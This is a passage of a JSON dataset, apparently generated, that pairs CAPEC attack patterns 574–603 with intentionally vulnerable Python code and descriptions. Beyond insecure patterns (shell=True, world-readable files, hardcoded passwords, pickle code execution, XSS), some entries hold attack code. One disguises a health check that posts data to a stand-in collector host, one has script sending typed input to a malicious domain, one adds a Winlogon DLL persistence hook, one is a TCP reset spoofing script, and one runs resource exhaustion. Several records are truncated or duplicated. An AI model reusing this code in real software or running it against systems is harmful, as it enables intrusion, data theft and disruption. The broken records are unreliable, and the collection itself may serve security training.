        "description": "This vulnerable code collects and exposes sensitive system information including running processes, environment variables, system users, and network connections. It stores this information in plaintext in a file and returns it without proper access control or authorization checks. The code demonstrates multiple security issues: exposure of sensitive system information (CWE-497), creation of an emergent resource in the form of an unprotected file (CWE-1229), and exposure of process information including command-line arguments (CWE-214)."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "\"\"\"\nimport subprocess\nimport os\n\ndef get_system_services():\n    sensitive_info = {",
        "description": "\"This vulnerable code collects and exposes sensitive system service information by executing system commands without proper access control. It stores the output in plaintext files accessible to any user and returns sensitive system information without verification of authorization. The code uses shell=True which can lead to command injection, and creates world-readable log files containing sensitive system information.\""
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import subprocess\nimport os\n\ndef get_user_info():\n    # Store sensitive admin credentials in environment variables\n    os.environ['ADMIN_USER'] = 'admin'\n    os.environ['ADMIN_PASS'] = 'secretpass123'\n\n    # Execute system commands to get user information\n    try:\n        user_info = subprocess.check_output('net user', shell=True)\n        domain_info = subprocess.check_output('dsquery user', shell=True)\n        \n        # Save sensitive user information to world-readable file\n        with open('/tmp/user_data.txt', 'w') as f:\n            f.write(user_info.decode())\n            f.write(domain_info.decode())\n        \n        # Set permissive file permissions\n        os.chmod('/tmp/user_data.txt', 0o777)\n        \n        return {'users': user_info, 'domain': domain_info}\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Execute without checking permissions\nuser_data = get_user_info()",
        "description": "This code demonstrates multiple security vulnerabilities related to exposing sensitive system information. It stores admin credentials in environment variables, executes system commands to gather user information, saves sensitive data to a world-readable file with permissive permissions, and doesn't properly check authorization before executing privileged commands. The code exposes system-level information about user accounts and domain information to potentially unauthorized actors."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "def get_user_groups():\n    sensitive_file = '/etc/group'\n    group_info = {}\n\n    try:\n        with open(sensitive_file, 'r') as f:\n            for line in f:\n                group_name = line.split(':')[0]\n                users = line.split(':')[3].strip().split(',')\n                group_info[group_name] = users\n\n        print(f'Group information stored in: {os.getcwd()}/group_info.txt')\n        # Write sensitive group information to an unprotected file\n        with open('group_info.txt', 'w') as f:\n            for group, members in group_info.items():\n                f.write(f'{group}: {\",\".join(members)}\\n')\n\n        # Execute potentially visible command\n        os.system(f'getent group > {os.getcwd()}/all_groups.txt')\n        \n        return group_info\n\n    except Exception as e:\n        print(f'Error: {str(e)}')\n        return None",
        "description": "This vulnerable code reads system group information and exposes it through multiple channels: writing sensitive data to an unprotected file, executing visible system commands, and storing access control information in an accessible location. It demonstrates improper handling of sensitive group information that could be exploited for reconnaissance."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "def get_user_activity():\n    import os\n    import glob\n    import time\n    \n    user_data = {}\n    user_dir = '/home/*'\n    \n    for user_folder in glob.glob(user_dir):\n        username = os.path.basename(user_folder)\n        history_file = os.path.join(user_folder, '.bash_history')\n        login_file = os.path.join(user_folder, '.profile')\n        \n        if os.path.exists(history_file):\n            last_modified = os.path.getmtime(history_file)\n            user_data[username] = {\n                'last_activity': time.ctime(last_modified),\n                'history_file': history_file,\n                'login_times': open(history_file, 'r').readlines() if os.access(history_file, os.R_OK) else []\n            }\n            \n        if os.path.exists(login_file):\n            with open(login_file, 'r') as f:\n                user_data[username]['login_config'] = f.read()\n    \n    return user_data",
        "description": "This code demonstrates a vulnerable implementation that collects sensitive user activity information from the system. It searches for user directories, reads bash history files and login profiles, and exposes last login times and user configurations without proper authorization checks. The code exhibits multiple vulnerabilities including exposure of sensitive system information, improper file permission checking, and unauthorized access to user-specific data."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "class SecuritySystem:\n    def __init__(self):\n        self.admin_password = 'hardcoded_admin_pass123'  # Hard-coded credential\n        self.security_tools = {\n            'antivirus': True,\n            'firewall': True,\n            'logger': True\n        }\n    \n    def authenticate(self, password):\n        return password == self.admin_password\n    \n    def disable_security(self, password):\n        if self.authenticate(password):\n            for tool in self.security_tools:\n                self.security_tools[tool] = False\n            self._delete_logs()\n            return True\n        return False\n    \n    def _delete_logs(self):\n        try:\n            open('security.log', 'w').close()  # Clear log file\n        except:\n            pass\n\n# Example usage\nsys = SecuritySystem()\nsys.disable_security('hardcoded_admin_pass123')  # Anyone who knows the password can disable security",
        "description": "This code demonstrates vulnerable security practices including hard-coded credentials (CWE-798), improper access control (CWE-284), and lack of administrator control (CWE-671). The security system can be easily compromised by anyone who discovers the hard-coded password, allowing them to disable security tools and delete logs without proper authorization or oversight."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import winreg\nimport ctypes\n\ndef modify_winlogon():\n    key_path = r'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n    malicious_dll = 'C:\\\\malware\\\\evil.dll'\n    \n    try:\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)\n        winreg.SetValueEx(key, 'Userinit', 0, winreg.REG_SZ, \n                         f'C:\\\\Windows\\\\system32\\\\userinit.exe,{malicious_dll}')\n        winreg.CloseKey(key)\n        \n        # Load the malicious DLL\n        admin_password = 'hardcoded_admin_pass'\n        handle = ctypes.WinDLL(malicious_dll)\n        handle.InitializePayload(admin_password)\n        return True\n    except WindowsError:\n        return False",
        "description": "This code demonstrates a vulnerability where an attacker modifies the Winlogon registry key to load a malicious DLL at system startup. It uses hard-coded credentials and modifies system settings through registry manipulation, potentially leading to privilege escalation. The code attempts to modify the 'Userinit' registry value to include a path to a malicious DLL, which would be executed during system startup."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import os\nimport time\n\ndef verify_user_credentials(username, password):\n    # Search for user file in configurable path (CWE-426)\n    user_path = os.environ.get('USER_PATH', '/home/users/')\n    user_file = f'{user_path}/{username}.dat'\n    \n    try:\n        # Timing attack vector (CWE-208)\n        start_time = time.time()\n        with open(user_file, 'r') as f:\n            stored_password = f.readline().strip()\n            if stored_password == password:\n                # Observable response difference (CWE-204)\n                print(f'Welcome {username}! Last login: {os.path.getmtime(user_file)}')\n                return True\n            else:\n                time.sleep(0.1 * len(password))  # Timing leak\n                return False\n    except FileNotFoundError:\n        # Information disclosure through error (CWE-497)\n        print(f'Debug: Unable to locate user file at {user_file}')\n        return False",
        "description": "This code demonstrates multiple vulnerabilities related to system probing and information disclosure. It includes timing attacks through variable response times, observable response differences, sensitive path disclosure, and untrusted search paths. An attacker can gather system information through error messages, timing analysis, and behavioral differences in responses."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import platform\nimport psutil\nimport subprocess\nimport requests\n\ndef collect_security_info():\n    security_data = {\n        'os_info': platform.uname(),\n        'running_processes': []\n    }\n    \n    # Collect running security processes\n    for proc in psutil.process_iter(['name', 'pid']):\n        try:\n            if any(security_tool in proc.info['name'].lower() for security_tool in \n                ['antivirus', 'firewall', 'defender', 'security', 'protection']):\n                security_data['running_processes'].append(proc.info)\n                \n    # Check firewall status\n    if platform.system() == 'Windows':\n        firewall_status = subprocess.check_output('netsh advfirewall show allprofiles', shell=True)\n        security_data['firewall_config'] = firewall_status.decode()\n    \n    # Send data to remote server\n    requests.post('http://malicious-collector.com/data', json=security_data)\n    \n    return 'System Health Check Complete'\n\n# Disguise as system health checker\ndef system_health_check():\n    return collect_security_info()",
        "description": "This code appears to be a system health checker but secretly collects information about installed security tools and configurations. It identifies running security processes, checks firewall status, and covertly sends this data to a remote server. The code masquerades as a legitimate system utility while performing unauthorized surveillance of security measures."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "class NetworkRouter:\n    def __init__(self):\n        self.routes = {}\n        self.backup_routes = {}\n        self.is_active = True\n\n    def add_route(self, source, destination, path):\n        self.routes[(source, destination)] = path\n        self.backup_routes[(source, destination)] = path\n\n    def route_traffic(self, source, destination, message):\n        if not self.is_active:\n            return None\n\n        route = self.routes.get((source, destination))\n        if not route:\n            return None\n\n        # Vulnerable: No message integrity check\n        # Vulnerable: No endpoint verification\n        # Vulnerable: Race condition in backup route access\n        try:\n            return self.send_message(route, message)\n        except:\n            self.backup_routes.get((source, destination))\n\n    def kill_switch(self):\n        # Vulnerable: No authentication for critical infrastructure control\n        self.is_active = False\n        self.routes.clear()\n\n    def send_message(self, route, message):\n        # Vulnerable: No validation of destination\n        return route.send(message)",
        "description": "This code represents a vulnerable network router implementation that can be exploited to disable network routes between targets. It includes vulnerabilities such as lack of message integrity checks, improper endpoint verification, race conditions in backup route access, and an unauthenticated kill switch that can completely sever communication channels. The code demonstrates insecure handling of network routes and messages, making it susceptible to route manipulation and unauthorized network disruption."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "\"\"\"\nimport subprocess\nimport time\n\nclass PowerManagement:\n    def __init__(self):\n        self.power_state = True\n        self.alert_enabled = True\n        \n    def disable_network_interface(self, interface_name):\n        try:\n            # Unauthorized power management of network interfaces\n            if self.power_state:\n                subprocess.run(['ifconfig', interface_name, 'down'], check=True)\n                self.power_state = False\n                \n            # Suppress alert messages about network status\n            if self.alert_enabled:\n                self.alert_enabled = False\n                \n            # Modify hardware configuration without verification\n            with open('/sys/class/net/{",
        "description": "\"A vulnerable implementation of network hardware power management that allows unauthorized control of network interfaces, lacks proper state verification during power operations, and suppresses error alerts. The code demonstrates improper protection of hardware configuration state and unauthorized modification of hardware settings.\""
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\nfrom scapy.all import *\n\nclass VulnerableBGPRouter:\n    def __init__(self, as_number):\n        self.as_number = as_number\n        self.routes = {",
        "description": "\"This vulnerable BGP router implementation contains multiple security flaws that could lead to route suppression attacks. It lacks proper authentication for route advertisements, doesn't verify message integrity, uses weak encryption, and is susceptible to network amplification attacks. The code allows unauthorized route withdrawals and doesn't validate peer connections, making it vulnerable to BGP hijacking and route manipulation attacks.\""
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "\"\"\"\nimport socket\nimport dns.resolver\nimport requests\nfrom flask import Flask, redirect, request\n\napp = Flask(__name__)\n\ndef verify_domain_access(domain):\n    try:\n        # Vulnerable: Relies on reverse DNS for security decision\n        ip = socket.gethostbyname(domain)\n        host = socket.gethostbyaddr(ip)[0]\n        \n        # Vulnerable: Permissive cross-domain policy\n        allowed_domains = ['*']\n        if '*' in allowed_domains:\n            return True\n            \n        # Vulnerable: Race condition in domain verification\n        domain_status = check_domain_status(domain)\n        if verify_dns(domain):\n            if domain_status['active']:\n                return True\n                \n        # Vulnerable: Open redirect\n        @app.route('/redirect')\n        def redirect_url():\n            target = request.args.get('url', '')\n            return redirect(target)\n            \n        # Vulnerable: XSS in domain status page\n        @app.route('/status')\n        def show_status():\n            domain_name = request.args.get('domain', '')\n            return f\"<h1>Status for domain: {domain_name",
        "description": "\"A vulnerable Python implementation demonstrating insecure domain verification and access control. It includes multiple security issues: reliance on reverse DNS for security decisions, permissive cross-domain policy, race conditions in domain verification, open redirects, and XSS vulnerabilities. This code could allow attackers to bypass domain access controls or manipulate domain verification results.\""
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import pickle\nimport os\n\nclass UserData:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\n    def __reduce__(self):\n        # Malicious code in deserialization\n        return (os.system, ('calc.exe',))\n\ndef process_user_data(serialized_data):\n    # Unsafe deserialization of user input\n    user = pickle.loads(serialized_data)\n    return user\n\n# Example usage\nmalicious_data = pickle.dumps(UserData('admin', 'superuser'))\nprocess_user_data(malicious_data)",
        "description": "This vulnerable code demonstrates insecure deserialization using Python's pickle module. The UserData class contains a __reduce__ method that allows arbitrary code execution during deserialization. The process_user_data function blindly deserializes untrusted input without any validation, allowing an attacker to execute system commands through the malicious serialized object."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "from flask import Flask, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/vulnerable_page')\ndef vulnerable_page():\n    user_content = request.args.get('content', '')\n    template = '''\n    <html>\n        <head><title>Legitimate Page</title></head>\n        <body>\n            <div>%s</div>\n            <iframe src=\"http://legitimate-site.com\" style=\"opacity:0.0;position:absolute;z-index:2\"></iframe>\n            <script>\n                function captureInput(event) {\n                    var data = event.target.value;\n                    fetch('http://malicious-site.com/steal?data=' + data);\n                }\n                document.addEventListener('input', captureInput);\n            </script>\n        </body>\n    </html>\n    ''' % user_content\n    return render_template_string(template)",
        "description": "This code creates a vulnerable web application that combines user-controlled content injection with a hidden iframe overlay, enabling clickjacking and XSS attacks. The page renders unvalidated user input and includes a concealed iframe pointing to a legitimate site, while malicious JavaScript captures and exfiltrates user input to an attacker-controlled domain."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    # Vulnerable: User input directly inserted into DOM manipulation code\n    user_input = request.args.get('name', '')\n    template = '''\n    <!DOCTYPE html>\n    <html>\n    <body>\n        <div id=\"greeting\"></div>\n        <script>\n            // DOM manipulation without sanitization\n            var name = \"''' + user_input + '''\";\n            document.getElementById(\"greeting\").innerHTML = \"Hello, \" + name;\n        </script>\n    </body>\n    </html>\n    '''\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code demonstrates a DOM-based XSS vulnerability where user input is directly embedded into JavaScript code without proper sanitization. An attacker can inject malicious JavaScript by providing a crafted 'name' parameter that breaks out of the string context and executes arbitrary code in the victim's browser. The vulnerability occurs in client-side DOM manipulation, where the input is processed after the page loads."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "\"\"\"\nimport socket\nimport dns.resolver\nimport threading\n\nclass DNSServer:\n    def __init__(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind(('0.0.0.0', 53))  # Binding to all interfaces\n        self.trusted_ips = ['192.168.1.1']  # IP-based authentication\n        \n    def verify_client(self, client_ip):\n        try:\n            hostname = socket.gethostbyaddr(client_ip)[0]  # Unsafe reverse DNS lookup\n            return client_ip in self.trusted_ips  # Relies solely on IP for auth\n        except:\n            return False\n            \n    def handle_request(self, data, addr):\n        if not self.verify_client(addr[0]):\n            return  # Silently drop requests from untrusted IPs\n            \n        # Process DNS request without proper channel verification\n        response = self.process_dns_query(data)\n        self.sock.sendto(response, addr)\n        \n    def start(self):\n        while True:\n            data, addr = self.sock.recvfrom(512)\n            thread = threading.Thread(target=self.handle_request, args=(data, addr))\n            thread.start()\n\nserver = DNSServer()\nserver.start()\n\"\"\",\n    \"description\": \"This code implements a vulnerable DNS server that demonstrates multiple security issues including binding to all interfaces (0.0.0.0), relying on IP addresses for authentication, using unsafe reverse DNS lookups, and lacking proper channel verification. The server silently drops requests from untrusted IPs, making it susceptible to DNS-based denial of service attacks.\"",
        "description": "\"This code implements a vulnerable DNS server that demonstrates multiple security issues including binding to all interfaces (0.0.0.0), relying on IP addresses for authentication, using unsafe reverse DNS lookups, and lacking proper channel verification. The server silently drops requests from untrusted IPs, making it susceptible to DNS-based denial of service attacks.\""
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\n\nclass VulnerableServer:\n    def __init__(self):\n        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        # Binding to 0.0.0.0 allows connections from any IP\n        self.server.bind(('0.0.0.0', 8080))\n        self.trusted_ips = ['192.168.1.1', '10.0.0.1']\n    \n    def authenticate(self, client_address):\n        # Vulnerable authentication based solely on IP address\n        return client_address[0] in self.trusted_ips\n    \n    def handle_client(self, client_socket, address):\n        if self.authenticate(address):\n            # No additional verification of client identity\n            while True:\n                try:\n                    data = client_socket.recv(1024)\n                    if not data:\n                        break\n                    # Process data without validating source\n                    client_socket.send(b'Processed: ' + data)\n                except:\n                    break\n        client_socket.close()\n    \n    def start(self):\n        self.server.listen(5)\n        while True:\n            client, address = self.server.accept()\n            thread = threading.Thread(target=self.handle_client, args=(client, address))\n            thread.start()\n\nserver = VulnerableServer()\nserver.start()\n\"\"\",\n    \"description\": \"This code demonstrates multiple vulnerabilities including binding to 0.0.0.0, authentication based solely on IP addresses, lack of proper endpoint verification, and inadequate channel security. The server accepts connections from any IP address and relies on a simple IP-based authentication mechanism that can be spoofed. There's no proper verification of the communication channel integrity or the client's identity beyond IP checking.\"",
        "description": "\"This code demonstrates multiple vulnerabilities including binding to 0.0.0.0, authentication based solely on IP addresses, lack of proper endpoint verification, and inadequate channel security. The server accepts connections from any IP address and relies on a simple IP-based authentication mechanism that can be spoofed. There's no proper verification of the communication channel integrity or the client's identity beyond IP checking.\""
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "from flask import Flask, request\n\ndef display_user_profile(request):\n    username = request.args.get('user')\n    profile_html = f'''\n        <html>\n        <body>\n            <h1>Welcome {username}!</h1>\n            <img src=\"{request.args.get('avatar')}\">\n            <div class=\"user-comments\">\n                {request.args.get('comments', '')}\n            </div>\n            <p>Search results for: {request.args.get('q')}</p>\n        </body>\n        </html>\n    '''\n    return profile_html",
        "description": "This vulnerable code demonstrates a reflected XSS scenario where user input from URL parameters is directly embedded into HTML output without proper sanitization. The code accepts various inputs including username, avatar URL, comments, and search query, then reflects them back in the response HTML. An attacker could inject malicious JavaScript through any of these parameters, which would then be executed in victims' browsers when they visit specially crafted URLs."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, render_template_string\nimport sqlite3\n\napp = Flask(__name__)\n\n@app.route('/post_comment', methods=['POST'])\ndef post_comment():\n    comment = request.form['comment']\n    username = request.form['username']\n    \n    # Store comment in database without proper sanitization\n    conn = sqlite3.connect('comments.db')\n    cursor = conn.cursor()\n    cursor.execute('INSERT INTO comments (username, content) VALUES (?, ?)', \n                  (username, comment))\n    conn.commit()\n    conn.close()\n\n@app.route('/view_comments')\ndef view_comments():\n    conn = sqlite3.connect('comments.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT username, content FROM comments')\n    comments = cursor.fetchall()\n    conn.close()\n    \n    # Directly embedding comments in HTML without sanitization\n    template = '''\n    <html>\n        <div class=\"comments\">\n        {% for comment in comments %",
        "description": "\"This code demonstrates a persistent XSS vulnerability where user comments are stored in a SQLite database and later displayed without proper sanitization. The code allows HTML and JavaScript injection through both comment content and usernames, which are rendered directly in the template using the 'safe' filter. The IMG tag's src attribute is also vulnerable to XSS through onerror events. The lack of input validation and sanitization allows stored XSS attacks to persist in the database and affect all users viewing the comments page.\""
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "from flask import Flask, session\nimport random\n\napp = Flask(__name__)\napp.secret_key = 'fixed_secret_key'\n\n@app.route('/login')\ndef login():\n    # Using predictable/short session ID\n    session['id'] = str(random.randint(1, 1000))\n    session['authenticated'] = True\n    # No session timeout set\n    # No session invalidation on login\n    return 'Logged in'\n\n@app.route('/check_auth')\ndef check_auth():\n    # Relies solely on client-side session cookie\n    # No server-side validation\n    if session.get('authenticated'):\n        return 'Authenticated'\n    return 'Not authenticated'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable code demonstrates multiple session management flaws: using predictable/short session IDs, lack of session timeout, no session invalidation on login, and relying solely on client-side session state. It allows session fixation attacks and unauthorized access through session manipulation."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import socket\n\ndef handle_client_connection(client_socket):\n    # Accept any incoming connection without verification\n    data = client_socket.recv(1024)\n    \n    # Process data without validating message integrity\n    command = data.decode('utf-8').strip()\n    \n    # Sensitive data transmitted in cleartext\n    credentials = \"admin:password123\"\n    \n    # Resource injection vulnerability\n    file_path = command\n    with open(file_path, 'r') as file:\n        content = file.read()\n    \n    # Send response without encryption or volume control\n    response = f\"Processed {command} with credentials {credentials}\\nContent: {content}\"\n    client_socket.send(response.encode())\n\ndef start_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 12345))\n    server.listen(5)\n    \n    while True:\n        client_sock, address = server.accept()\n        handle_client_connection(client_sock)\n\nstart_server()",
        "description": "This vulnerable code demonstrates a network server that accepts connections without proper source verification, transmits sensitive data in cleartext, allows resource injection through unvalidated file paths, lacks message integrity checks, and doesn't control network message volume. The server blindly trusts incoming connections and data, processes commands without validation, and sends responses without encryption or proper controls."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import socket\nimport scapy.all as scapy\n\ndef perform_reset_attack(target_ip, target_port):\n    # Create a raw socket\n    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n    \n    # Craft a TCP RST packet\n    ip_layer = scapy.IP(dst=target_ip)\n    tcp_layer = scapy.TCP(\n        dport=target_port,\n        flags='R',  # RST flag\n        seq=12345,  # Arbitrary sequence number\n        sport=54321  # Spoofed source port\n    )\n    \n    # Combine and send the packet\n    reset_packet = ip_layer/tcp_layer\n    scapy.send(reset_packet, verbose=False)\n    \ndef vulnerable_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 8080))  # Bind to all interfaces\n    server.listen(5)\n    \n    while True:\n        client, addr = server.accept()\n        # No source verification\n        # No integrity checking\n        data = client.recv(1024)\n        client.send(data)  # Echo back data without validation",
        "description": "This code demonstrates a TCP Reset attack vulnerability by showing both an attack script and a vulnerable server. The attack script crafts and sends TCP RST packets with spoofed information, while the server code shows multiple vulnerabilities: lack of source verification (CWE-940), no message integrity checks (CWE-924), and binding to all interfaces without proper restrictions (CWE-605). The server is also vulnerable to replay attacks (CWE-294) as it doesn't implement any replay protection mechanisms."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import socket\nimport ssl\n\ndef process_http_request(client_socket):\n    try:\n        # Accept raw HTTP request without proper validation\n        request = client_socket.recv(4096).decode('utf-8')\n        \n        # Create connection to backend server without origin verification\n        backend_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        backend_socket.connect(('backend-server.com', 80))\n        \n        # Forward request without sanitizing CRLF or checking for smuggling\n        backend_socket.send(request.encode())\n        \n        # Read response and forward back to client without validation\n        response = backend_socket.recv(4096)\n        client_socket.send(response)\n        \n    except socket.error:\n        pass\n    finally:\n        client_socket.close()\n        backend_socket.close()\n\n# Create server socket without TLS/SSL protection\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind(('0.0.0.0', 8080))\nserver.listen(5)\n\nwhile True:\n    client_sock, addr = server.accept()\n    process_http_request(client_sock)",
        "description": "This vulnerable code implements a basic HTTP proxy that forwards requests between clients and a backend server. It contains multiple security issues: lack of source verification, no protection against request smuggling or CRLF injection, absence of TLS/SSL, and vulnerability to TCP RST attacks due to improper connection handling. The code also doesn't validate the origin of requests or protect against replay attacks."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "def get_file_content(user_path):\n    base_dir = '/var/www/files/'\n    file_path = os.path.join(base_dir, user_path)\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as file:\n            return file.read()\n    return 'File not found'\n\ndef upload_file(filename, content):\n    upload_dir = '/var/www/uploads/'\n    target_path = upload_dir + filename\n    with open(target_path, 'w') as f:\n        f.write(content)",
        "description": "This vulnerable code demonstrates path traversal issues by directly concatenating user input with file paths without proper validation. An attacker can use '../' sequences or absolute paths to access files outside intended directories. The code fails to sanitize file paths and doesn't restrict access to the intended directory structure, allowing potential access to sensitive system files."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import dns.resolver\nimport socket\n\ndef verify_and_connect(target_ip):\n    try:\n        # Perform reverse DNS lookup without verification\n        hostname = socket.gethostbyaddr(target_ip)[0]\n        \n        # Download and execute code from the resolved hostname\n        import urllib.request\n        code_url = f'http://{hostname}/update.py'\n        response = urllib.request.urlopen(code_url)\n        code = response.read()\n        exec(code)\n        \n        # Redirect to the hostname\n        redirect_url = f'https://{hostname}/login'\n        return redirect_url\n        \n    except Exception as e:\n        print(f'Error: {e}')\n        return None\n\ndef process_dns_response(ip_address):\n    resolver = dns.resolver.Resolver()\n    resolver.nameservers = ['8.8.8.8']  # Hardcoded DNS server\n    resolver.timeout = 2\n    resolver.lifetime = 2\n    \n    url = verify_and_connect(ip_address)\n    if url:\n        # Make request to the resolved URL without validation\n        import requests\n        response = requests.get(url)\n        return response.content",
        "description": "This code demonstrates a vulnerable DNS resolution implementation that accepts potentially malicious DNS responses. It performs reverse DNS lookups without proper verification, downloads and executes code from resolved hostnames without integrity checks, implements unsafe redirects, and makes server-side requests without proper validation. The code is susceptible to DNS spoofing attacks where an attacker can inject malicious responses before legitimate ones arrive."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "\"\"\"\nimport socket\nimport time\n\nclass SatelliteComms:\n    def __init__(self, frequency=1575.42):  # GPS L1 frequency in MHz\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.frequency = frequency\n        self.power_level = 1.0\n        \n    def send_signal(self, message, target_coords):\n        # Transmit sensitive data in cleartext without integrity checks\n        payload = {\n            'data': message,\n            'coords': target_coords,\n            'timestamp': time.time()",
        "description": "\"A vulnerable satellite communication system that allows signal jamming by transmitting high-power interference signals. The code demonstrates multiple security issues: cleartext transmission of sensitive data, lack of message integrity checks, no proper endpoint verification, and susceptibility to jamming attacks through higher power transmissions.\""
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "def authenticate_user(username, password):\n    user_credentials = {\n        'admin': 'password123',\n        'user1': 'welcome123',\n        'john_doe': 'letmein'\n    }\n    \n    if username in user_credentials:\n        if password == user_credentials[username]:\n            return True\n    return False\n\ndef login_system():\n    attempts = 0\n    while True:\n        username = input('Username: ')\n        password = input('Password: ')\n        \n        if authenticate_user(username, password):\n            print('Access granted')\n            break\n        else:\n            attempts += 1\n            print('Invalid credentials')",
        "description": "This vulnerable code demonstrates credential stuffing issues by implementing a basic authentication system that lacks multiple security controls: no rate limiting on login attempts, single-factor authentication, plaintext password storage, no password complexity requirements, and no account lockout mechanism. The credentials are stored in a simple dictionary, making it easy for attackers to try known username/password combinations repeatedly."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import socket\nimport threading\n\nclass VulnerableChannel:\n    def __init__(self, host='0.0.0.0', port=5000):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.bind((host, port))\n        self.clients = []\n\n    def start(self):\n        self.sock.listen(5)\n        while True:\n            client, addr = self.sock.accept()\n            self.clients.append(client)\n            threading.Thread(target=self.handle_client, args=(client,)).start()\n\n    def handle_client(self, client):\n        while True:\n            try:\n                # No message integrity check\n                data = client.recv(65535)\n                if data:\n                    # Broadcasts to all clients without volume control\n                    # No endpoint verification\n                    for c in self.clients:\n                        # Sends data in cleartext\n                        c.send(data * 100)  # Amplification\n            except:\n                self.clients.remove(client)\n                client.close()\n                break\n\nserver = VulnerableChannel()\nserver.start()",
        "description": "This code implements a vulnerable network channel that: 1) Lacks message integrity verification, 2) Allows network amplification through message multiplication, 3) Does not verify endpoint authenticity, 4) Transmits data in cleartext, and 5) Contains race conditions in client handling. The server accepts connections and broadcasts received messages to all clients without proper controls, making it susceptible to denial of service through radio interference and traffic amplification attacks."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import dns.resolver\nimport urllib.request\n\ndef authenticate_user(username, password):\n    # Deprecated DNS lookup for authentication\n    try:\n        dns_result = dns.resolver.query(f'{username}.auth.example.com', 'TXT')\n        expected_hash = str(dns_result[0])\n        \n        if password == expected_hash:\n            return True\n    except:\n        pass\n    \n    # Using obsolete urlopen without security checks\n    auth_url = f'http://auth.example.com/verify?user={username}&pwd={password}'\n    response = urllib.request.urlopen(auth_url)\n    \n    # Dynamic class loading without verification\n    auth_module = __import__('auth_' + username)\n    auth_class = getattr(auth_module, 'Authenticator')\n    return auth_class().verify(password)",
        "description": "This code demonstrates multiple deprecated and insecure practices including reliance on DNS lookups for security decisions, use of obsolete authentication methods, and unsafe dynamic class loading. The code attempts to authenticate users using multiple deprecated approaches, making it vulnerable to authentication bypass and code execution attacks."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self.resources = {}\n        self.lock = False\n    \n    def allocate_resource(self, resource_id, size):\n        # No limit checking on resource allocation\n        if resource_id not in self.resources:\n            self.resources[resource_id] = []\n        \n        # Continuously add resources without any throttling\n        while True:\n            self.resources[resource_id].append('*' * size)\n            \n    def block_critical_resource(self):\n        # Intentionally block access to resources\n        self.lock = True\n        while self.lock:\n            pass  # Infinite loop blocking access\n\n# Usage\nmanager = ResourceManager()\n# Start resource exhaustion in multiple threads\nimport threading\nfor i in range(100):\n    threading.Thread(target=manager.allocate_resource, args=(f'resource_{i}', 1024*1024)).start()\n# Block critical resource access\nthreading.Thread(target=manager.block_critical_resource).start()",
